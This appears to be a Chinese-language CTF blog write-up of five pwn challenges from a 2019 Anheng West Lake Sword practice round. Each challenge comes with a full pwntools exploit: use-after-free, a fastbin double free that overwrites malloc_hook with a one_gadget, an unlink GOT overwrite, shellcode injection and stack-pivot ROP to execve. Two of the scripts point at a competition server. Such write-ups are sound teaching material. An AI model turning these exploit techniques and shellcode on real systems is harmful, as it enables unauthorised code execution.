@@ -1,0 +1,512 @@
+---
+layout: post
+title:  "2019.4.1 安恒 西湖论剑 周周练 pwn writeup"
+tags: [writeup, pwn]
+date: 2019-04-01
+comments: false
+---
+
+# 安恒西湖论剑特别版周周练 pwn writeup
+
+
+## unote
+
+跟hitcon training lab10相似，但是限制了只能add三个note。
+
+checksec
+
+![5ca21837211fb](https://i.loli.net/2019/04/01/5ca21837211fb.png)
+
+添加note时，都会先malloc一个8bytes的区域，暂且叫他note头。
+
+note头的前4个bytes存放puts函数地址，后4个bytes存放指向note内容的指针。
+
+note头在堆中结构如下：
+
+         |                   0        |           0x10        |        puts函数地址          |      指向note内容的指针|
+
+执行查看note内容功能时，是通过执行 puts函数地址(指向note内容的指针) 进行的。
+
+数组ptr中存放的是每个note头的地址。
+
+1. UAF
+
+   ![5ca215e91de1f](https://i.loli.net/2019/04/01/5ca215e91de1f.png)
+
+   没有清空ptr中的指针。
+
+2. 自带一个system函数
+
+   ![5ca216bcefb53](https://i.loli.net/2019/04/01/5ca216bcefb53.png)
+
+   ![5ca216a11e008](https://i.loli.net/2019/04/01/5ca216a11e008.png)
+
+   可以看到跟puts一样 把指向note内容的指针当作参数。
+
+   因此可以想到，用system覆盖note头的puts函数，用/bin/sh地址覆盖指向note内容的指针。
+
+   使用ptr中的dangling pointer来执行system('/bin/sh')，得到shell.
+
+3. 有一个输入点
+
+   ![5ca2177294fd7](https://i.loli.net/2019/04/01/5ca2177294fd7.png)
+
+        可以用来存放/bin/sh
+
+脚本如下:
+
+```python
+from pwn import *
+
+io = process('./unote')
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' ,'-c']
+
+def addnote(size,content):
+        io.sendafter('your choice :','1')
+        io.sendafter('Note size :',str(size))
+        io.sendafter('Content :',content)
+
+def delnote(idx):
+        io.sendafter('your choice :','2')
+        io.sendafter('Index :',str(idx))
+
+def printnote(idx):
+        io.sendafter('your choice :','3')
+        io.sendafter('Index :',str(idx))
+name = 0x804a070
+sys = 0x08048672
+io.recv()
+io.send('/bin/sh\x00')
+addnote(32,'A'*8)
+addnote(32,'B'*8)
+delnote(0)
+delnote(1)
+
+addnote(8,p32(sys)+p32(name))
+printnote(0)
+io.interactive()
+
+```
+
+
+
+---
+
+## pwn3
+
+checksec
+
+![5ca32ecadd82f](https://i.loli.net/2019/04/02/5ca32ecadd82f.png)
+
+保护全开，不能写got表，考虑写malloc__hook
+
+看一下具体功能。
+
+1. 三个功能 添加，展示，删除![5ca32f906f540](https://i.loli.net/2019/04/02/5ca32f906f540.png)
+
+2. add函数，可以malloc任意大小，没有溢出![5ca32f9947535](https://i.loli.net/2019/04/02/5ca32f9947535.png)
+
+3. show函数，通过chunklist调用，可能有UAF![5ca32f9f19cd6](https://i.loli.net/2019/04/02/5ca32f9f19cd6.png)
+
+4. del函数，UAF，double free
+
+![5ca32fa412bc7](https://i.loli.net/2019/04/02/5ca32fa412bc7.png)
+
+
+
+
+
+可以malloc任意大小，UAF可以leak出libc，利用fastbin attack，2free配合找一个MALLOC_HOOK上方字节错位的地方，实现Arbitrary Alloc，然后覆盖MALLOC_HOOK为ONE_GADGET。再malloc一次拿到shell。
+
+
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+
+
+# Author: le3d1ng
+# Created Time : 2019年04月02日 星期二 17时15分37秒
+# File Name: exp.py
+
+# Description:
+
+from pwn import *
+
+#io = process('./pwn3')
+io = remote('101.71.29.5',10002)
+#context.log_level = 'debug'
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+'''LOCAL
+0x45216	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4	execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147	execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+'''REMOTE
+0x45216	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4	execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147	execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+libcoffset = 0x3c4b78
+onegadgetoffset = 0xf1147
+def DEBUG():
+	gdb.attach(io)
+	io.interactive()
+
+def add(size,content):
+	io.sendafter('Choice>','1')
+	io.sendafter('>',str(size))
+	io.sendafter('>',content)
+
+def view(idx):
+	io.sendafter('Choice>','2')
+	io.sendafter('>',str(idx))
+
+def delnote(idx):
+	io.sendafter('Choice>','3')
+	io.sendafter('>',str(idx))
+#leak libc with UAF
+add(128,'A'*16)
+add(128,'B'*16)
+delnote(0)
+view(0)
+io.recvuntil("]:")
+mainarena88 = u64(io.recv(6).ljust(8,'\x00'))
+libcbase = mainarena88 - libcoffset
+ONE_GADGET = libcbase + onegadgetoffset
+malloc_hook = mainarena88 - 0x68
+success("libcbase :" + hex(libcbase))
+success("malloc_hook :"+hex(malloc_hook))
+success("ONE_GADGET :"+hex(libcbase + onegadgetoffset))
+
+
+#fastbin 2free attack
+
+add(0x60,'D'*16) #2
+add(0x60,'E'*16) #3
+add(0x60,'F'*16)
+delnote(2)   #double free
+delnote(3)
+delnote(2)
+
+
+#arbitrary alloc
+success("arbitrary alloc :" + hex(malloc_hook-0x1b-0x8))
+paddingdis = malloc_hook-(malloc_hook-0x1b-0x8+0x10)
+success("padding distance to overwrite malloc_hook :"+hex(paddingdis))
+add(0x60,p64(malloc_hook-0x1b-0x8))
+add(0x60,'le3d1ng')
+add(0x60,'le3d1ng')
+
+
+#overwrite MALLOC_HOOK and getshell
+success("over writing MALLOC_HOOK...")
+add(0x60,'A'*paddingdis+p64(ONE_GADGET))
+io.sendlineafter(">",'1')
+io.send('have fun')
+success("GOT SHELL!")
+io.interactive()
+```
+
+
+
+---
+
+
+
+## pwn2
+
+
+
+checksec![5ca350757d86f](https://i.loli.net/2019/04/02/5ca350757d86f.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+1. main ![5ca350d79c851](https://i.loli.net/2019/04/02/5ca350d79c851.png)
+
+2. 2![5ca3518348065](https://i.loli.net/2019/04/02/5ca3518348065.png)固定0x80大小，没有检查当前index是否有结点，同一个index可以被覆盖
+
+3. 3![5ca351882aaea](https://i.loli.net/2019/04/02/5ca351882aaea.png)任意长度写，可以溢出到下一个堆
+
+4. 4![5ca3518d5b071](https://i.loli.net/2019/04/02/5ca3518d5b071.png)UAF，name处存在dangling pointer
+
+5. 5![5ca35191ccb26](https://i.loli.net/2019/04/02/5ca35191ccb26.png)
+
+6. 6![5ca35195d0612](https://i.loli.net/2019/04/02/5ca35195d0612.png)自带的后门函数
+
+
+
+edit_node可以溢出到下一个堆，同时也存在一个chunk_list储存所有堆指针，可以构造fake_chunk来进行unlink。
+
+达到Arbitrary Write，同时注意到edit_node中有一个没用的getchar()，可以覆写其got表为后门函数指针。再次edit_node拿到shell。
+
+
+
+```python
+from pwn import *
+
+io = process('./pwn2')
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+#elf = ELF('./pwn2')
+
+def DEBUG():
+	gdb.attach(io)
+	io.interactive()
+
+def createnode(idx):
+	io.recvuntil("----\n")
+	io.sendline('1')
+
+	io.sendline(str(idx))
+
+def editnode(idx,length,content):
+	io.sendlineafter("---------------------------\n",'2')
+
+	io.sendline(str(idx))
+
+	io.sendline(str(length))
+
+	io.sendline(content)
+	
+def delnode(idx):
+	io.sendlineafter("---------------------------\n",'3')
+	io.sendline(str(idx))
+
+def shownode(idx):
+	io.sendafter("---------------------------\n",'3')
+	io.sendafter("to create:",str(idx))
+
+
+p_chunk0 = 0x6012a0
+showmenu = 0x4009C7
+getchargot =0x601238
+test = 0x4009B6
+
+createnode(0)
+createnode(1)
+createnode(2)
+pay = p64(0)+p64(128+1)+p64(p_chunk0-0x18)+p64(p_chunk0-0x10)
+pay += 'A'*(128-4*8)
+pay += p64(128)+p64(128+0x10) + 'le3d1ng'
+editnode(0,len(pay),pay)
+delnode(1)
+
+pay = p64(0) + p64(0) + p64(0) + p64(p_chunk0 - 0x18) + p64(getchargot)
+editnode(0,len(pay),pay)
+
+editnode(1,8,p64(test))
+editnode(0,1,'a')
+io.interactive()
+#DEBUG()
+```
+
+这题远程环境有问题，打过去全程没回显。
+
+---
+
+
+
+
+
+## pwn1
+
+
+
+checksec
+
+![5ca355b6979d5](https://i.loli.net/2019/04/02/5ca355b6979d5.png)
+
+
+
+这题IDA里F5有问题，是因为call eax这个指令。
+
+指令也不麻烦，直接读汇编把。
+
+![5ca355ebbfef2](https://i.loli.net/2019/04/02/5ca355ebbfef2.png)
+
+sub esp,30H
+
+读取输入的buf在esp+13H这个地址，读取20个字节
+
+最后lea eax,\[esp+13H\]
+
+call eax
+
+输入一段长度20字节以内的shellcode即可。
+
+
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+'''offset 15'''
+
+#io = process('./pwn_1')
+
+io = remote("101.71.29.5",10000)
+
+
+shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
+
+io.sendline(shellcode)
+io.interactive()
+```
+
+---
+
+
+
+## moon over
+
+
+
+checksec
+
+![5ca357300a43d](https://i.loli.net/2019/04/02/5ca357300a43d.png)
+
+
+
+![5ca357d344dec](https://i.loli.net/2019/04/02/5ca357d344dec.png)
+
+
+
+![5ca357d9d85a7](https://i.loli.net/2019/04/02/5ca357d9d85a7.png)
+
+
+
+![5ca3585318e91](https://i.loli.net/2019/04/02/5ca3585318e91.png)
+
+
+
+开辟的栈大小为50H，从rsp处开始接受输入，可以接受的输入长度为60H，64位，刚好可以覆盖到rbp和返回地址。也可以泄露出上一个栈帧的rbp，从而根据固定偏移计算出当前rsp等位置。
+
+开启了NX，不可以ret2shellcode，可以考虑ROP。
+
+
+
+rbp可控，可以使用fake framing来劫持rsp从而劫持控制流，返回到构造好的ROP上。
+
+详见:https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#frame-faking
+
+
+
+主要是通过两次leave ret来实现。
+
+leave = mov rsp,rbp;pop rbp
+
+ret = pop rip
+
+第一次通过leave中的pop rbp使rbp跑到目标区域，第二次通过leave中的mov rsp,rbp让rsp过去。
+
+这题的fake framing选在了rsp起始的位置，也就是栈顶。
+
+
+
+```python
+from pwn import *
+
+io = process('./over')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+'''
+0x0000000000400793 : pop rdi ; ret
+'''
+'''
+libcgadgets 0x00000000001150c9 : pop rdx(3) ; pop rsi(2) ; ret
+'''
+elf = ELF('./over')
+libc = elf.libc
+leaveret = 0x4006be
+poprdiret = 0x400793
+io.recv()
+
+#leak old rbp to cal stack addr
+payload = "A"*79 + "B"
+io.send(payload)
+io.recvuntil("B")
+oldebp = u64(io.recv()[0:6].ljust(8,'\x00'))
+nowebp = oldebp - 32
+stackstart = nowebp - 80
+print hex(oldebp),hex(nowebp),hex(stackstart)
+
+
+#ROP to leak libc
+payload = p64(1) + p64(poprdiret) + p64(elf.got['puts']) + p64(elf.plt['puts'])+p64(0x400676) + "A"*(80-5*8) + p64(stackstart) + p64(leaveret)
+
+#gdb.attach(io)
+#io.interactive()
+io.send(payload)
+io.recv(2)
+putaddr = u64(io.recv()[0:6].ljust(8,'\x00'))
+print hex(putaddr)
+libcbase = putaddr - libc.symbols['puts']
+execveaddr = libcbase + libc.symbols['execve']
+binshaddr = libcbase + libc.search('/bin/sh').next()
+
+pop_rdx_rsi_ret = 0x00000000001150c9+libcbase
+
+
+
+#ROP to get shell by calling execve
+pay = p64(1) + p64(poprdiret) + p64(binshaddr) + p64(pop_rdx_rsi_ret) + p64(0) + p64(0) + p64(execveaddr) + p64(0xdeafbeef) + 'A'*(80-8*8) + p64(stackstart-0x30) + p64(leaveret)
+
+
+io.send(pay)
+
+
+io.interactive()
+```
+
+需要注意，多次返回到函数的时候，要跟着rsp走关注rsp所在的位置，同时也要看好函数刚开始开辟栈帧的操作对rsp的影响。
+
+比如此题
+
+![5ca35e120f5b8](https://i.loli.net/2019/04/02/5ca35e120f5b8.png)
+
+执行push rbp之前，rsp指向第一段payload中"AAAAAAAA"的位置。距离stackstart有0x20+8。
+
+执行push rbp之后，rsp指向第一段payload中 p64(0x400676) 的位置，距离stackstart有0x20。
+
+执行sub rsp,0x50之后，rsp跑到了(stackstart + 0x20) - 0x50 也就是 stackstart - 0x30这个地方，后面的第二段payload也就从这里开始存，因此后面要构造fake framing的时候rbp要指向stackstart - 0x30。
+
+
